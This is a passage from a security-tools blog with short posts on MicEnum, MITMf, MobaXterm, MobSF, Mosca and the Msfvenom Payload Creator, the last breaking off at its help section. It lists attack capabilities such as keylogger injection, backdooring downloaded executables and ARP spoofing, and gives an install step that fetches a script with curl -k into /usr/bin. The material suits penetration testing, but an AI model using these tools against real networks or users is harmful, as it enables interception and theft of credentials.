       <table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;">
        <tbody> 
         <tr>
          <td style="text-align: center;"><a href="http://3.bp.blogspot.com/-0u36-JVeyVg/VZp1i7yHDjI/AAAAAAAADJ0/6CgaSTRIMzE/s1600/MICEnum2.PNG" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="375" src="http://3.bp.blogspot.com/-0u36-JVeyVg/VZp1i7yHDjI/AAAAAAAADJ0/6CgaSTRIMzE/s400/MICEnum2.PNG" width="400"></a></td>
         </tr> 
         <tr>
          <td class="tr-caption" style="text-align: center;">MicEnum scanning a Windows registry branch</td>
         </tr> 
        </tbody>
       </table> 
       <br> For setting new integrity levels, just use the contextual menu again and set the desired level. 
       <b>Do not change them if you do not know what you are doing. </b>You may need administrator privileges to achieve the change.
       <br> 
       <br> 
       <table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;">
        <tbody> 
         <tr>
          <td style="text-align: center;"><a href="http://3.bp.blogspot.com/-HFd8lLoxfOo/VZp1iy_vpdI/AAAAAAAADJw/v1GtVQFF-Kk/s1600/MICEnum3.PNG" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="382" src="http://3.bp.blogspot.com/-HFd8lLoxfOo/VZp1iy_vpdI/AAAAAAAADJw/v1GtVQFF-Kk/s400/MICEnum3.PNG" width="400"></a></td>
         </tr> 
         <tr>
          <td class="tr-caption" style="text-align: center;">The program allows to set different integrity levels</td>
         </tr> 
        </tbody>
       </table> 
       <br> For forensic purposes, the whole "session" or information about the integrity levels may be saved as an XML file. Later you may restore it with this same tool. Once restored, icons are missing, and there is no chance to set new values, of course, since you are not using your "live" hard disk.
       <br> 
       <br> 
       <table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;">
        <tbody> 
         <tr>
          <td style="text-align: center;"><a href="http://2.bp.blogspot.com/-GgvyomHBYnk/VZp1jQ9Jp4I/AAAAAAAADJ4/7mBxy8pUdGk/s1600/MICEnum4.PNG" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="382" src="http://2.bp.blogspot.com/-GgvyomHBYnk/VZp1jQ9Jp4I/AAAAAAAADJ4/7mBxy8pUdGk/s400/MICEnum4.PNG" width="400"></a></td>
         </tr> 
         <tr>
          <td class="tr-caption" style="text-align: center;">If a session is loaded, the different values are shown</td>
         </tr> 
        </tbody>
       </table> 
       <br> This all applies to registry branches as well, in its correspondent tab.
       <br> 
       <br> MicEnum is inspired in 
       <a href="https://technet.microsoft.com/en-us/library/bb897332.aspx" target="_blank">AccessEnum</a>, a classical tool by Sysinternals that enumerates NTFS permissions and helps detecting anomalies.
       <br> 
       <br> 
       <br> 
       <div style="text-align: center;"> 
        <a href="https://www.elevenpaths.com/labstools/micenum/index.html" target="_blank"><b><span style="font-size: x-large;">Download MicEnum</span></b></a>
       </div> 
      </div> 
      <br> 
     </div>
    </article> 
    <article class="post hentry" id="8036497056560918398" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> MITMf - Framework for Man-In-The-Middle attacks  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8036497056560918398" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-RI_NsKjE9tw/VXYiefkq1lI/AAAAAAAAEMU/PrxU37GOhTY/s1600/mitmf.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="152" src="http://1.bp.blogspot.com/-RI_NsKjE9tw/VXYiefkq1lI/AAAAAAAAEMU/PrxU37GOhTY/s640/mitmf.png" width="640"></a>
      </div> 
      <br> Framework for Man-In-The-Middle attacks
      <br> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;"> Available plugins</span></b>
      <br> 
      <ul> 
       <li><code>SMBtrap</code> - Exploits the 'SMB Trap' vulnerability on connected clients</li> 
       <li><code>Screenshotter</code> - Uses HTML5 Canvas to render an accurate screenshot of a clients browser</li> 
       <li><code>Responder</code> - LLMNR, NBT-NS, WPAD and MDNS poisoner</li> 
       <li><code>SSLstrip+</code> - Partially bypass HSTS</li> 
       <li><code>Spoof</code> - Redirect traffic using ARP spoofing, ICMP redirects or DHCP spoofing</li> 
       <li><code>BeEFAutorun</code> - Autoruns BeEF modules based on a client's OS or browser type</li> 
       <li><code>AppCachePoison</code> - Perform app cache poisoning attacks </li> 
       <li><code>Ferret-NG</code> - Transperently hijacks sessions</li> 
       <li><code>BrowserProfiler</code> - Attempts to enumerate all browser plugins of connected clients</li> 
       <li><code>CacheKill</code> - Kills page caching by modifying headers</li> 
       <li><code>FilePwn</code> - Backdoor executables sent over HTTP using the Backdoor Factory and BDFProxy</li> 
       <li><code>Inject</code> - Inject arbitrary content into HTML content</li> 
       <li><code>BrowserSniper</code> - Performs drive-by attacks on clients with out-of-date browser plugins</li> 
       <li><code>jskeylogger</code> - Injects a Javascript keylogger into a client's webpages</li> 
       <li><code>Replace</code> - Replace arbitary content in HTML content</li> 
       <li><code>SMBAuth</code> - Evoke SMB challenge-response authentication attempts</li> 
       <li><code>Upsidedownternet</code> - Flips images 180 degrees</li> 
      </ul> 
      <br> 
      <b><span style="font-size: large;"> How to install on Kali</span></b>
      <br> 
      <pre><code>apt-get install mitmf</code></pre> 
      <br> 
      <br> 
      <b><span style="font-size: large;"> <a aria-hidden="true" class="anchor" href="https://github.com/byt3bl33d3r/MITMf#installation" id="user-content-installation"></a>Installation</span></b>
      <br> If MITMf is not in your distro's repo or you just want the latest version:
      <br> 
      <ul> 
       <li>Run the command <code>git clone https://github.com/byt3bl33d3r/MITMf.git</code> to clone this directory</li> 
       <li>Run the <code>setup.sh</code> script</li> 
       <li>Run the command <code>pip install --upgrade -r requirements.txt</code> to install all Python dependencies</li> 
      </ul> 
      <br> On Kali Linux, if you get an error while installing the 
      <code>pypcap</code> package or when starting MITMf you see: 
      <code>ImportError: no module named pcap</code>, run 
      <code>apt-get install python-pypcap</code> to fix it 
      <br> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank">Download&nbsp;MITMf</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="8687643187095462757" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> MobaXterm - Terminal for Windows with X11 server, tabbed SSH client, network tools and much more...  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8687643187095462757" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-vJCmVShKPw0/VTpMGE9VQ1I/AAAAAAAAD58/tPgm5_K-YhA/s1600/MobaXterm.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-vJCmVShKPw0/VTpMGE9VQ1I/AAAAAAAAD58/tPgm5_K-YhA/s1600/MobaXterm.png" height="368" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        MobaXterm is your 
       <b>ultimate toolbox for remote computing</b>. In a single Windows application, it provides loads of functions that are tailored for programmers, webmasters, IT administrators and pretty much all users who need to handle their remote jobs in a more simple fashion.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        MobaXterm provides all the important 
       <b>remote network tools</b> (SSH, X11, RDP, VNC, FTP, MOSH, ...) and 
       <b>Unix commands</b> (bash, ls, cat, sed, grep, awk, rsync, ...) to Windows desktop, in a 
       <b>single portable exe file</b> which works out of the box.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        There are many advantages of having an 
       <b>All-In-One network application</b> for your remote tasks, e.g. when you use 
       <b>SSH</b> to connect to a remote server, a graphical 
       <b>SFTP browser</b> will automatically pop up in order to directly edit your remote files. Your remote applications will also display seamlessly on your Windows desktop using the embedded 
       <b>X server</b>.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        You can download and use MobaXterm Home Edition for free. If you want to use it inside your company, you should consider subscribing to MobaXterm Professional Edition: this will give you access to much more features, professional support and "Customizer" software.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        When developing MobaXterm, we focused on a simple aim: proposing an 
       <b>intuitive user interface</b> in order for you to 
       <b>efficiently access remote servers</b> through different networks or systems.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Key features </span></b>
      </div> 
      <div> 
       <div style="text-align: justify;"> 
        <br>
       </div> 
      </div> 
      <div> 
       <div class="row icon-block key_feature"> 
        <div> 
         <div style="text-align: justify;"> 
          <strong> Embedded X server</strong>Fully configured Xserver based on X.org
         </div> 
        </div> 
       </div> 
       <div class="row icon-block key_feature"> 
        <div class="col-lg-2 col-md-2 col-sm-2 key_feature_icon"> 
         <i class="fa fa-image"></i> 
        </div> 
        <div> 
         <div style="text-align: justify;"> 
          <strong> Easy DISPLAY exportation</strong> DISPLAY is exported from remote Unix to local Windows
         </div> 
        </div> 
       </div> 
       <div class="row icon-block key_feature"> 
        <div class="col-lg-2 col-md-2 col-sm-2 key_feature_icon"> 
         <i class="fa fa-code-fork"></i> 
        </div> 
        <div> 
         <div style="text-align: justify;"> 
          <strong> X11-Forwarding capability</strong> Your remote display uses SSH for secure transport
         </div> 
        </div> 
       </div> 
       <div class="row icon-block key_feature"> 
        <div class="col-lg-2 col-md-2 col-sm-2 key_feature_icon"> 
         <i class="fa fa-terminal"></i> 
        </div> 
        <div> 
         <div style="text-align: justify;"> 
          <strong> Tabbed terminal with SSH</strong> Based on PuTTY/MinTTY with antialiased fonts and macro support
         </div> 
        </div> 
       </div> 
       <div class="row icon-block key_feature"> 
        <div class="col-lg-2 col-md-2 col-sm-2 key_feature_icon"> 
         <i class="fa fa-linux"></i> 
        </div> 
        <div> 
         <div style="text-align: justify;"> 
          <strong> Many Unix/Linux commands on Windows</strong> Includes basic Cygwin commands (bash, grep, awk, sed, rsync,...)
         </div> 
        </div> 
       </div> 
       <div class="row icon-block key_feature"> 
        <div class="col-lg-2 col-md-2 col-sm-2 key_feature_icon"> 
         <i class="fa fa-puzzle-piece"></i> 
        </div> 
        <div> 
         <div style="text-align: justify;"> 
          <strong> Add-ons and plugins</strong> You can extend MobaXterm capabilities with plugins
         </div> 
        </div> 
       </div> 
       <div class="row icon-block key_feature"> 
        <div class="col-lg-2 col-md-2 col-sm-2 key_feature_icon"> 
         <i class="fa fa-sitemap"></i> 
        </div> 
        <div> 
         <div style="text-align: justify;"> 
          <strong> Versatile session manager</strong> All your network tools in one app: Rdp, Vnc, Ssh, Mosh, X11, ...
         </div> 
        </div> 
       </div> 
       <div class="row icon-block key_feature"> 
        <div class="col-lg-2 col-md-2 col-sm-2 key_feature_icon"> 
         <i class="fa fa-code"></i> 
        </div> 
        <div> 
         <div style="text-align: justify;"> 
          <strong> Portable and light application</strong> MobaXterm has been packaged as a single executable which does not require admin rights and which you can start from an USB stick
         </div> 
        </div> 
       </div> 
       <div class="row icon-block key_feature"> 
        <div class="col-lg-2 col-md-2 col-sm-2 key_feature_icon"> 
         <i class="fa fa-group"></i> 
        </div> 
        <div> 
         <div style="text-align: justify;"> 
          <strong> Professional application</strong> MobaXterm Professional has been designed for security and stability for very challenging people
          <br> 
          <br> 
          <b><span style="font-size: large;">MobaXterm plugins </span></b>
          <br> 
          <br> 
          <strong>Corkscrew:</strong> Corkscrew allows to tunnel TCP connections through HTTP proxies 
          <br> 
          <strong>Curl:</strong> Curl is a command line tool for transferring data with URL syntax 
          <br> 
          <strong>CvsClient:</strong> A command line tool to access CVS repositories 
          <br> 
          <strong>Gcc, G++ and development tools:</strong> the GNU C/C++ compiler and other development tools 
          <br> 
          <strong>DnsUtils:</strong> This plugin includes some useful utilities for host name resolution:
         </div> 
        </div> 
       </div> 
      </div> 
      <div style="text-align: justify;">
        dig, host, nslookup and nsupdate. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>E2fsProgs:</strong> Utilities for creating, fixing, configuring, and debugging ext2/3/4 filesystems. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Emacs:</strong> The extensible, customizable, self-documenting real-time display editor 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Exif:</strong> Command-line utility to show EXIF information hidden in JPEG files. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>FVWM2:</strong> A light but powerful window manager for X11. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>File:</strong> Determines file type using magic numbers. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Fontforge:</strong> A complete font editor with many features 
      </div> 
      <div style="text-align: justify;"> 
       <strong>GFortran:</strong> The GNU Fortran compiler. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Git:</strong> A fast and powerful version control system. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Gvim:</strong> The Vim editor with a GTK interface 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Httperf:</strong> A tool for measuring web server performance. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Joe:</strong> Fast and simple editor which emulates 5 other editors. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Lftp:</strong> Sophisticated file transfer program and ftp/http/bittorrent client. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Lrzsz:</strong> Unix communication package providing the XMODEM, YMODEM ZMODEM file transfer protocols. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Lynx:</strong> A text-mode web browser. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>MPlayer:</strong> The ultimate video player 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Midnight Commander:</strong> Midnight Commander is a feature rich text mode visual file manager. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Mosh:</strong> MOSH has been included into MobaXterm main executable in version 7.1 directly in the sessions manager. This plugin is deprecated. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Multitail:</strong> Program for monitoring multiple log files, in the fashion of the original tail program. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>NEdit:</strong> NEdit is a multi-purpose text editor for the X Window System. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Node.js:</strong> Node.js is a platform built on Chrome's JavaScript runtime for easily building fast, scalable network applications. This plugin does not include NPM. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>OpenSSL:</strong> A toolkit implementing SSL v2/v3 and TLS protocols. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>PdKsh:</strong> A KSH shell open-source implementation. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Perl:</strong> Larry Wall's Practical Extracting and Report Language 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Png2Ico:</strong> Png2Ico Converts PNG files to Windows icon resource files. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Python:</strong> An interpreted, interactive object-oriented programming language. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Ruby:</strong> Interpreted object-oriented scripting language. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Screen:</strong> Screen is a terminal multiplexer and window manager that runs many separate 'screens' on a single physical character-based terminal. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Sqlite3:</strong> Software library that implements a self-contained, serverless, zero-configuration, transactional SQL database engine. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>SquashFS:</strong> mksquashfs and unsquashfs tools allow you to create/unpack squashfs filesystems from Windows. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Subversion (SVN):</strong> Subversion is a powerful version control system. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Tcl / Tk / Expect:</strong> Tcl is a simple-to-learn yet very powerful language. Tk is its graphical toolkit. Expect is an automation tool for terminal. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>X11Fonts:</strong> Complete set of fonts for X11 server. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>X3270Suite:</strong> IBM 3270 terminal emulator for Windows. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>XServers:</strong> Xephyr, Xnest, Xdmx, Xvfb and Xfake alternate X11 servers. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Xmllint:</strong> A command line XML tool. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Xorg (legacy):</strong> The old X11 (Xorg v1.6.5) server: use this plugin if you have trouble connecting to an old Unix station through XDMCP. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Zip:</strong> Zip compression utility. 
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="http://mobaxterm.mobatek.net/download.html" target="_blank">Download&nbsp;MobaXterm</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="7598105344140317380" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> MobSF (Mobile Security Framework) - Mobile (Android/iOS) Automated Pen-Testing Framework  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7598105344140317380" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-Wd_-rEurqQY/ViwNiiUcjpI/AAAAAAAAEvE/GcGSe1rPtKk/s1600/MobSF.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-Wd_-rEurqQY/ViwNiiUcjpI/AAAAAAAAEvE/GcGSe1rPtKk/s1600/MobSF.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Mobile Security Framework (MobSF) is an intelligent, all-in-one open source mobile application (Android/iOS) automated pen-testing framework capable of performing static and dynamic analysis. We've been depending on multiple tools to carry out reversing, decoding, debugging, code review, and pen-test and this process requires a lot of effort and time. Mobile Security Framework can be used for effective and fast security analysis of Android and iOS Applications. It supports binaries (APK &amp; IPA) and zipped source code.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        The static analyzer is able to perform automated code review, detect insecure permissions and configurations, and detect insecure code like ssl overriding, ssl bypass, weak crypto, obfuscated codes, improper permissions, hardcoded secrets, improper usage of dangerous APIs, leakage of sensitive/PII information, and insecure file storage. The dynamic analyzer runs the application in a VM or on a configured device and detects the issues at run time. Further analysis is done on the captured network packets, decrypted HTTPS traffic, application dumps, logs, error or crash reports, debug information, stack trace, and on the application assets like setting files, preferences, and databases. This framework is highly scalable that you can add your custom rules with ease. A quick and clean report can be generated at the end of the tests. We will be extending this framework to support other mobile platforms like Tizen, WindowsPhone etc. in future. 
      </div> 
      <br> 
      <span style="font-size: large;"> <b> Documentation </b> </span> 
      <br> 
      <ul> 
       <li> <a href="https://github.com/ajinabraham/Mobile-Security-Framework-MobSF/wiki/Documentation" target="_blank"> https://github.com/ajinabraham/Mobile-Security-Framework-MobSF/wiki/Documentation </a> </li> 
      </ul> 
      <br> 
      <span style="font-size: large;"> <b> Queries </b> </span> 
      <br> 
      <ul> 
       <li> Features Requests: <a href="http://twitter.com/ajinabraham" target="_blank"> @ajinabraham </a> or <a href="http://twitter.com/OpenSecurity_IN" target="_blank"> @OpenSecurity_IN </a> . </li> 
       <li> Open Bugs Here: <a href="https://github.com/ajinabraham/YSO-Mobile-Security-Framework/issues" target="_blank"> https://github.com/ajinabraham/YSO-Mobile-Security-Framework/issues </a> </li> 
      </ul> 
      <br> 
      <span style="font-size: large;"> <b> Screenshots and Sample Report </b> </span> 
      <br> 
      <br> 
      <b> Static Analysis - Android APK </b> 
      <br> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-NOvU9JjktT0/ViwN_OmhVSI/AAAAAAAAEvM/ePwsdx3iI7g/s1600/MobSF_01.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="300" src="http://3.bp.blogspot.com/-NOvU9JjktT0/ViwN_OmhVSI/AAAAAAAAEvM/ePwsdx3iI7g/s640/MobSF_01.png" width="640"></a>
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-klQQHVDm_oE/ViwOI5v8zMI/AAAAAAAAEvU/CjAYCOEsWZY/s1600/MobSF_02.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="362" src="http://2.bp.blogspot.com/-klQQHVDm_oE/ViwOI5v8zMI/AAAAAAAAEvU/CjAYCOEsWZY/s640/MobSF_02.png" width="640"></a>
      </div> 
      <br> 
      <br> 
      <b> Static Analysis - iOS IPA </b> 
      <br> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-Phl4w2yMDyA/ViwOTlZxPzI/AAAAAAAAEvc/C2pMxnuHnkQ/s1600/MobSF_03.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="362" src="http://2.bp.blogspot.com/-Phl4w2yMDyA/ViwOTlZxPzI/AAAAAAAAEvc/C2pMxnuHnkQ/s640/MobSF_03.png" width="640"></a>
      </div> 
      <br> 
      <br> Sample Report: 
      <a href="http://opensecurity.in/research/security-analysis-of-android-browsers.html" target="_blank"> http://opensecurity.in/research/security-analysis-of-android-browsers.html</a>
      <br> 
      <br> 
      <b> v0.8.8 Changelog </b> 
      <br> 
      <ul> 
       <li> New name: Mobile Security Framework (MobSF) </li> 
       <li> Added Dynamic Analysis </li> 
       <li> VM Available for Download </li> 
       <li> Fixed RCE </li> 
       <li> Fixed Broken Manifest File Parsing Logic </li> 
       <li> Sqlite DB Support </li> 
       <li> Fixed Reporting with new PDF report </li> 
       <li> Rescan Option </li> 
       <li> Detect Root Detection </li> 
       <li> Added Requiremnts.txt </li> 
       <li> Automated Java Path Detection </li> 
       <li> Improved Manifest and Code Analysis </li> 
       <li> Fixed Unzipping error for Unix. </li> 
       <li> Activity Tester Module </li> 
       <li> Exported Activity Tester Module </li> 
       <li> Device API Hooker with DroidMon </li> 
       <li> SSL Certificate Pinning Bypass with JustTrustMe </li> 
       <li> RootCloak to prevent root Detection </li> 
       <li> Data Pusher to Dump Application Data </li> 
       <li> pyWebproxy to decrypt SSL Traffic </li> 
      </ul> 
      <br> 
      <b> v0.8.7 Changelog </b> 
      <br> 
      <ul> 
       <li> Improved Static Analysis Rules </li> 
       <li> Better AndroidManifest View </li> 
       <li> Search in Files </li> 
      </ul> 
      <br> 
      <b> v0.8.6 Changelog </b> 
      <br> 
      <ul> 
       <li> Detects implicitly exported component from manifest. </li> 
       <li> Added CFR decompiler support </li> 
       <li> Fixed Regex DoS on URL Regex </li> 
      </ul> 
      <br> 
      <b> v0.8.5 Changelog </b> 
      <br> 
      <ul> 
       <li> Bug Fix to support IPA MIME Type: application/x-itunes-ipa </li> 
      </ul> 
      <br> 
      <b> v0.8.4 Changelog </b> 
      <br> 
      <ul> 
       <li> Improved Android Static Code Analysis speed (2X performance) </li> 
       <li> Static Code analysis on Dexguard protected APK. </li> 
       <li> Fixed a Security Issue - Email Regex DoS. </li> 
       <li> Added Logging Code. </li> 
       <li> All Browser Support. </li> 
       <li> MIME Type Bug fix to Support IE. </li> 
       <li> Fixed Progress Bar. </li> 
      </ul> 
      <br> 
      <b> v0.8.3 Changelog </b> 
      <br> 
      <ul> 
       <li> View AndroidManifest.xml &amp; Info.plist </li> 
       <li> Supports iOS Binary (IPA) </li> 
       <li> Bug Fix for Linux (Ubuntu), missing MIME Type Detection </li> 
       <li> Check for Hardcoded Certificates </li> 
       <li> Added Code to prevent from Directory Traversal </li> 
      </ul> 
      <br> 
      <span style="font-size: large;"> <b> Credits </b> </span> 
      <br> 
      <ul> 
       <li> Bharadwaj Machiraju (@tunnelshade_) - For writing pyWebProxy from scratch </li> 
       <li> Thomas Abraham - For JS Hacks on UI. </li> 
       <li> Anto Joseph (@antojosep007) - For the help with SuperSU. </li> 
       <li> Tim Brown (@timb_machine) - For the iOS Binary Analysis Ruleset. </li> 
       <li> Abhinav Sejpal (@Abhinav_Sejpal) - For poking me with bugs and feature requests. </li> 
       <li> Anant Srivastava (@anantshri) - For Activity Tester Idea </li> 
      </ul> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b> <span style="font-size: x-large;"> <a href="https://github.com/ajinabraham/Mobile-Security-Framework-MobSF" target="_blank"> Download Mobile-Security-Framework-Mobsf </a> </span> </b> 
      </div> 
     </div>

    <article class="post hentry" id="2743937953207729963" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Mosca - Static Analysis Tool To Find Bugs  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-2743937953207729963" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-nThmzAk8SxE/Vm249gj2GwI/AAAAAAAAE5w/79O9e5suF7c/s1600/Mosca.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-nThmzAk8SxE/Vm249gj2GwI/AAAAAAAAE5w/79O9e5suF7c/s1600/Mosca.jpg"></a>
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-1UXiF1_NRso/Vm249mIVSyI/AAAAAAAAE50/Ubv1TZ8EP6c/s1600/codeview.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="222" src="http://3.bp.blogspot.com/-1UXiF1_NRso/Vm249mIVSyI/AAAAAAAAE50/Ubv1TZ8EP6c/s640/codeview.png" width="640"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Just another Simple static analysis tool to find bugs like a grep unix command, at mosca have a modules, that was call egg, each egg is a simple config to find bug at especific language like PHP,Ruby,ASP etc... Example of egg config at directory "egg", If Mosca read a line with vunerability of egg in source code, then, mosca have alert about vulnerability and save at logs.
      </div> 
      <a name="more"></a>
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/CoolerVoid/Mosca" target="_blank">Download Mosca</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="5667642693792186852" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> MPC - Msfvenom Payload Creator  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-5667642693792186852" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-utAtffLJzmE/VcKfAh7j8JI/AAAAAAAAEdE/vCBLIcpOVaE/s1600/MPC.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="368" src="http://4.bp.blogspot.com/-utAtffLJzmE/VcKfAh7j8JI/AAAAAAAAEdE/vCBLIcpOVaE/s640/MPC.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Msfvenom Payload Creator (MPC) is a wrapper to generate multiple types of payloads, based on users choice. The idea is to be as 
       <strong>simple as possible</strong> (
       <strong>only requiring one input</strong>) to produce their payload.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>Fully automating</strong> msfvenom &amp; Metasploit is the end goal 
       <em>(well as to be be able to automate MPC itself)</em>. The rest is to make the user's life as 
       <strong>easy as possible</strong> (e.g. 
       <strong>IP selection menu</strong>, 
       <strong>msfconsole resource file/commands</strong>, 
       <strong>batch payload production</strong> and able to enter 
       <strong>any argument in any order</strong> 
       <em>(in various formats/patterns)</em>).
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        The only necessary input from the user should be 
       <strong>defining the payload</strong> they want by either the 
       <strong>platform</strong> (e.g. 
       <code>windows</code>), or the 
       <strong>file extension</strong> they wish the payload to have (e.g. 
       <code>exe</code>).
      </div> 
      <ul> 
       <li style="text-align: justify;"><strong>Can't remember your IP for a interface? Don't sweat it, just use the interface name</strong>: <code>eth0</code>.</li> 
       <li style="text-align: justify;"><strong>Don't know what your external IP is? MPC will discover it</strong>: <code>wan</code>.</li> 
       <li style="text-align: justify;"><strong>Want to generate one of each payload? No issue!</strong> Try: <code>loop</code>.</li> 
       <li style="text-align: justify;"><strong>Want to mass create payloads? Everything? Or to filter your select? ..Either way, its not a problem</strong>. Try: <code>batch</code> (for everything), <code>batch msf</code> (for every Meterpreter option), <code>batch staged</code> (for every staged payload), or <code>batch cmd stageless</code> (for every stageless command prompt)!</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <em>Note: This will <strong>not</strong> try to bypass any anti-virus solutions.</em>
      </div> 
      <br> 
      <b><span style="font-size: large;"> Install</span></b>
      <br> 
      <ul> 
       <li>Designed for <strong>Kali Linux v1.1.0a+</strong> &amp; <strong>Metasploit v4.11+</strong> <em>(nothing else has been tested)</em>.</li> 
      </ul> 
      <pre><code>curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" &gt; /usr/bin/mpc
chmod +x /usr/bin/mpc
mpc
</code></pre> 
      <br> 
      <b><span style="font-size: large;"> Help</span></b>
